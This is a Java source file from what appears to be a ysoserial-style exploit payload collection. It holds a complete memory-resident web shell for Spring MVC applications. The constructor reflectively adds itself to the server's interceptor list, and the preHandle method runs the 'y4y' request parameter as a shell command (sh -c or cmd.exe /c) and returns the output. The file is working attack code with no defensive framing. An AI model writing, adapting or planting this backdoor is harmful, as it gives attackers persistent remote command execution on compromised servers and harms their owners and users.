package ysoserial.payloads;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;


public class SpringInterceptor extends HandlerInterceptorAdapter {
    public SpringInterceptor() throws Exception{
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = null;
        try {
            abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");

        } catch (Exception e){
            abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");

        }
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        SpringInterceptor tmp = new SpringInterceptor("a");
        adaptedInterceptors.add(tmp);

    }

    public SpringInterceptor(String s){

    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("y4y");
        if (cmd != null) {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;

            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            java.io.PrintWriter out = response.getWriter();
            out.write(">>|");
            out.write(output);
            out.write("|<<");
            out.flush();
            out.close();
            return true;

        } else {
            return true;

        }
    }
}
